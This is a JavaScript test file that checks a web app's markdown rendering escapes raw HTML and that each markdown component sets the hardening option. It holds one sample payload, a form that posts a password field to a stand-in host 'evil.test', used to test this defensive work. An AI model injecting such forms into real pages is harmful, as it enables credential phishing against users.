const { describe, test } = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const path = require('node:path')

const React = require('react')
const { renderToStaticMarkup } = require('react-dom/server')
const Markdown = require('markdown-to-jsx/react').default

const EVIL = '<form action="https://evil.test"><input name="pw"></form>'
const render = options =>
    renderToStaticMarkup(React.createElement(Markdown, options, EVIL))

describe('markdown raw-HTML hardening (M2)', () => {
    test('disableParsingRawHTML renders raw HTML as text, not DOM', () => {
        const out = render({ options: { disableParsingRawHTML: true } })
        assert.ok(!out.includes('<form'), 'raw <form> must not be rendered')
        assert.match(out, /&lt;form/) // shown as escaped text instead
    })

    test('control: without the option the library WOULD render the HTML', () => {
        // Guards against a library upgrade silently changing behavior: if this
        // stops rendering <form>, the option above may no longer be doing work.
        const out = render(null)
        assert.ok(out.includes('<form'))
    })

    test('every <Markdown> sink passes disableParsingRawHTML', () => {
        const files = [
            'src/pages/workshops/[id].js',
            'src/pages/services/[id].js',
            'src/pages/requests/[id].js',
            'src/components/Conversations.js',
        ]
        for (const f of files) {
            const src = fs.readFileSync(
                path.join(__dirname, '..', '..', f),
                'utf8'
            )
            // Each <Markdown ...> opening tag must carry the option within it.
            const tags = src.match(/<Markdown[^>]*>/gs) || []
            assert.ok(tags.length > 0, `${f}: no <Markdown> found`)
            for (const tag of tags)
                assert.match(
                    tag,
                    /disableParsingRawHTML:\s*true/,
                    `${f}: a <Markdown> lacks disableParsingRawHTML`
                )
        }
    })
})
